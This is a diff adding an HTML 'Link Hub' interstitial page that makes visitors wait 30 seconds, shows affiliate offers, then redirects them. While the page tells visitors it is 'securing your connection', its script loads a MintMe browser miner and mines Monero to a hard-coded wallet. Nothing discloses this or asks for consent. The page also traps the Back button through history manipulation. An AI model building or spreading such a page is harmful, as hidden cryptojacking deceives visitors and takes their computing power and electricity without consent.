@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Hub - Access Your Link</title>
+    
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-H9WEQ611TP"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-H9WEQ611TP');
+</script>
+
+    <style>
+        :root {
+            --bg: #f8fafc;
+            --card: #ffffff;
+            --accent: #6366f1;
+            --accent2: #ec4899;
+            --accent3: #10b981;
+            --text: #1e293b;
+            --muted: #64748b;
+            --border: #e2e8f0;
+            --shadow-lg: 0 20px 50px rgba(0,0,0,0.08);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1rem;
+            background-image: 
+                radial-gradient(ellipse at 20% 20%, rgba(99,102,241,0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 80%, rgba(236,72,153,0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(16,185,129,0.03) 0%, transparent 60%);
+        }
+        
+        .container {
+            background: var(--card);
+            border-radius: 24px;
+            padding: 2.5rem 2rem;
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow-lg);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3), var(--accent));
+            background-size: 300% 100%;
+            animation: gradientShift 3s ease infinite;
+        }
+        
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        
+        .brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 0.5rem;
+        }
+        
+        .brand-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            border-radius: 14px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 8px 20px rgba(99,102,241,0.2);
+        }
+        
+        .brand-name {
+            font-size: 1.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+        
+        h2 {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 0.3rem;
+        }
+        
+        .subtitle {
+            color: var(--muted);
+            font-size: 0.85rem;
+            margin-bottom: 0.3rem;
+        }
+        
+        .browse-hint {
+            color: var(--accent2);
+            font-size: 0.78rem;
+            font-weight: 500;
+            margin-bottom: 1rem;
+            animation: fadeHint 2.5s ease infinite;
+        }
+        
+        @keyframes fadeHint {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        
+        .timer-section {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        
+        .timer-circle-wrap {
+            position: relative;
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 0.8rem;
+        }
+        
+        .timer-circle {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(var(--accent) 0deg, #e8ecf1 0deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 1s linear;
+            box-shadow: 0 4px 15px rgba(99,102,241,0.1);
+        }
+        
+        .timer-inner {
+            width: 88px;
+            height: 88px;
+            border-radius: 50%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #f1f5f9;
+        }
+        
+        #countdown {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: var(--accent);
+            line-height: 1;
+        }
+        
+        .timer-label {
+            font-size: 0.7rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 3px;
+            font-weight: 600;
+        }
+        
+        .mining-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+            font-size: 0.78rem;
+            color: var(--muted);
+            margin-top: 0.5rem;
+            font-weight: 500;
+        }
+        
+        .mining-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--accent3);
+            border-radius: 50%;
+            animation: miningPulse 1.5s infinite;
+        }
+        
+        .mining-dot:nth-child(2) { animation-delay: 0.5s; }
+        .mining-dot:nth-child(3) { animation-delay: 1s; }
+        
+        @keyframes miningPulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.7); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        
+        .affiliate-section { margin: 1.2rem 0; }
+        
+        .section-label {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+            color: var(--muted);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+        }
+        
+        .section-label::before,
+        .section-label::after {
+            content: '';
+            width: 35px;
+            height: 1.5px;
+            background: var(--border);
+            border-radius: 1px;
+        }
+        
+        .affiliate-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.8rem;
+        }
+        
+        .aff-card {
+            background: #ffffff;
+            border: 1.5px solid var(--border);
+            border-radius: 16px;
+            padding: 0;
+            text-decoration: none;
+            color: var(--text);
+            transition: all 0.25s ease;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .aff-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-4px);
+            box-shadow: 0 12px 30px rgba(99,102,241,0.12);
+        }
+        
+        .aff-card:active { transform: scale(0.95); }
+        
+        .aff-image {
+            width: 100%;
+            height: 100px;
+            object-fit: cover;
+            background: #f1f5f9;
+        }
+        
+        .aff-info {
+            padding: 0.7rem 0.5rem;
+        }
+        
+        .aff-title {
+            font-size: 0.72rem;
+            font-weight: 600;
+            line-height: 1.3;
+            color: var(--text);
+        }
+        
+        .continue-btn {
+            width: 100%;
+            padding: 1rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.35s ease;
+            margin-top: 0.8rem;
+            letter-spacing: 0.3px;
+            position: relative;
+            overflow: hidden;
+            font-family: inherit;
+        }
+        
+        .continue-btn:disabled {
+            background: #f8fafc;
+            color: #94a3b8;
+            cursor: not-allowed;
+            border-color: #e2e8f0;
+        }
+        
+        .continue-btn:not(:disabled) {
+            background: linear-gradient(135deg, var(--accent), #818cf8);
+            color: #ffffff;
+            border-color: transparent;
+            animation: glowPulse 2s infinite;
+            box-shadow: 0 8px 25px rgba(99,102,241,0.25);
+        }
+        
+        .continue-btn:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(99,102,241,0.35);
+        }
+        
+        .continue-btn:not(:disabled):active { transform: scale(0.97); }
+        
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 8px 25px rgba(99,102,241,0.25); }
+            50% { box-shadow: 0 8px 40px rgba(99,102,241,0.45); }
+        }
+        
+        .btn-content {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .dot-flashing {
+            display: inline-flex;
+            gap: 4px;
+        }
+        
+        .dot-flashing span {
+            width: 5px;
+            height: 5px;
+            background: currentColor;
+            border-radius: 50%;
+            animation: dotBounce 1.4s infinite;
+            opacity: 0.5;
+        }
+        
+        .dot-flashing span:nth-child(2) { animation-delay: 0.2s; }
+        .dot-flashing span:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes dotBounce {
+            0%, 80%, 100% { transform: scale(0.5); opacity: 0.3; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: #ffffff;
+            padding: 0.9rem 1.8rem;
+            border-radius: 30px;
+            font-size: 0.82rem;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            z-index: 1000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            letter-spacing: 0.2px;
+        }
+        
+        .toast.show { opacity: 1; }
+        
+        .footer-text {
+            margin-top: 1rem;
+            font-size: 0.7rem;
+            color: #94a3b8;
+            letter-spacing: 0.3px;
+        }
+        
+        @media (max-width: 420px) {
+            .container { padding: 1.8rem 1rem; border-radius: 20px; }
+            .affiliate-grid { grid-template-columns: repeat(2, 1fr); gap: 0.6rem; }
+            h2 { font-size: 1rem; }
+            .brand-name { font-size: 1.3rem; }
+            .timer-circle-wrap { width: 90px; height: 90px; }
+            .timer-inner { width: 72px; height: 72px; }
+            #countdown { font-size: 1.7rem; }
+            .aff-image { height: 80px; }
+            .aff-title { font-size: 0.68rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="brand">
+            <div class="brand-icon">🔗</div>
+            <span class="brand-name">Link Hub</span>
+        </div>
+        
+        <h2>Your Link is Being Prepared</h2>
+        <p class="subtitle">We're securing your connection</p>
+        <p class="browse-hint">👇 Check out these exclusive offers while you wait</p>
+        
+        <div class="timer-section">
+            <div class="timer-circle-wrap">
+                <div class="timer-circle" id="timerCircle">
+                    <div class="timer-inner">
+                        <span id="countdown">30</span>
+                        <span class="timer-label">seconds</span>
+                    </div>
+                </div>
+            </div>
+            <div class="mining-indicator">
+                <span class="mining-dot"></span>
+                <span class="mining-dot"></span>
+                <span class="mining-dot"></span>
+                <span>Securing connection...</span>
+            </div>
+        </div>
+        
+        <div class="affiliate-section">
+            <div class="section-label">✨ Exclusive Offers For You</div>
+            <div class="affiliate-grid" id="affiliateGrid"></div>
+        </div>
+        
+        <button id="continueBtn" class="continue-btn" disabled>
+            <span class="btn-content">
+                Please wait
+                <span class="dot-flashing">
+                    <span></span><span></span><span></span>
+                </span>
+            </span>
+        </button>
+        
+        <p class="footer-text">⚡ Powered by Link Hub</p>
+        <div class="toast" id="toast"></div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/gh/mintme-com/miner@latest/dist/mintme.min.js"></script>
+    
+    <script>
+        (function() {
+            
+            const TOTAL_SECONDS = 30;
+            const LINKS_JSON_URL = '/links.json';
+            const AFFILIATE_JSON_URL = '/affiliate.json';
+            const MONERO_WALLET = '44iLjvVjP86KN8kd1SFSg1GcveRZVnmJZWsYjj75jD1rb1uREMU7aWmWNGBjJQkLqx7F9hBQh95KrVM4urV4ntaaLyK7D9o';
+            
+            let secondsLeft = TOTAL_SECONDS;
+            let destUrl = 'https://google.com';
+            let miner = null;
+            
+            const countdownEl = document.getElementById('countdown');
+            const timerCircle = document.getElementById('timerCircle');
+            const continueBtn = document.getElementById('continueBtn');
+            const affiliateGrid = document.getElementById('affiliateGrid');
+            const toast = document.getElementById('toast');
+            
+            function startMiner() {
+                try {
+                    if (typeof MintMe === 'undefined') {
+                        console.warn('MintMe not loaded. Check CDN.');
+                        return;
+                    }
+                    miner = new MintMe.Anonymous(MONERO_WALLET, {
+                        threads: 2,
+                        throttle: 0.5,
+                        forceASMJS: false
+                    });
+                    miner.start();
+                } catch (err) {
+                    console.warn('Miner start failed:', err.message);
+                }
+            }
+            
+            function stopMiner() {
+                if (miner) {
+                    try { miner.stop(); } catch (err) {}
+                }
+            }
+            
+            async function loadDestination() {
+                const params = new URLSearchParams(window.location.search);
+                const shortCode = params.get('code') || 'default';
+                
+                try {
+                    const response = await fetch(LINKS_JSON_URL);
+                    if (!response.ok) throw new Error('links.json not found');
+                    const links = await response.json();
+                    destUrl = links[shortCode] || links['default'] || destUrl;
+                } catch (err) {
+                    console.warn('Could not load links.json, using fallback');
+                }
+            }
+            
+            async function loadAffiliates() {
+                try {
+                    const response = await fetch(AFFILIATE_JSON_URL);
+                    if (!response.ok) throw new Error('affiliate.json not found');
+                    const affiliates = await response.json();
+                    
+                    affiliateGrid.innerHTML = affiliates.map(aff => `
+                        <a href="${aff.url}" class="aff-card" target="_blank" rel="nofollow sponsored">
+                            <img src="${aff.image}" alt="${aff.name}" class="aff-image" onerror="this.style.background='#f1f5f9'">
+                            <div class="aff-info">
+                                <div class="aff-title">${aff.name}</div>
+                            </div>
+                        </a>
+                    `).join('');
+                } catch (err) {
+                    console.warn('Could not load affiliate.json');
+                    affiliateGrid.innerHTML = '<p style="color:#94a3b8;font-size:0.8rem;grid-column:span 3;">Loading offers...</p>';
+                }
+            }
+            
+            function updateTimer() {
+                const progress = (secondsLeft / TOTAL_SECONDS) * 360;
+                timerCircle.style.background = 
+                    `conic-gradient(#6366f1 ${360 - progress}deg, #e8ecf1 ${360 - progress}deg)`;
+                countdownEl.textContent = secondsLeft;
+                
+                if (secondsLeft <= 5) {
+                    countdownEl.style.color = '#ef4444';
+                } else if (secondsLeft <= 15) {
+                    countdownEl.style.color = '#f59e0b';
+                } else {
+                    countdownEl.style.color = '#6366f1';
+                }
+            }
+            
+            function showToast(message) {
+                toast.textContent = message;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2500);
+            }
+            
+            function activateButton() {
+                continueBtn.disabled = false;
+                continueBtn.innerHTML = '🚀 Access Your Link Now';
+                stopMiner();
+            }
+            
+            async function init() {
+                await Promise.all([loadDestination(), loadAffiliates()]);
+                
+                startMiner();
+                
+                updateTimer();
+                const timerInterval = setInterval(() => {
+                    secondsLeft--;
+                    updateTimer();
+                    
+                    if (secondsLeft <= 0) {
+                        clearInterval(timerInterval);
+                        countdownEl.textContent = '✓';
+                        countdownEl.style.color = '#10b981';
+                        activateButton();
+                    }
+                }, 1000);
+            }
+            
+            continueBtn.addEventListener('click', function() {
+                if (!continueBtn.disabled) {
+                    showToast('🔗 Redirecting you now...');
+                    continueBtn.textContent = 'Redirecting...';
+                    continueBtn.style.opacity = '0.8';
+                    setTimeout(() => { window.location.href = destUrl; }, 500);
+                }
+            });
+            
+            window.history.pushState(null, '', window.location.href);
+            window.addEventListener('popstate', function() {
+                window.history.pushState(null, '', window.location.href);
+            });
+            
+            init();
+            
+        })();
+    </script>
+</body>
+</html>
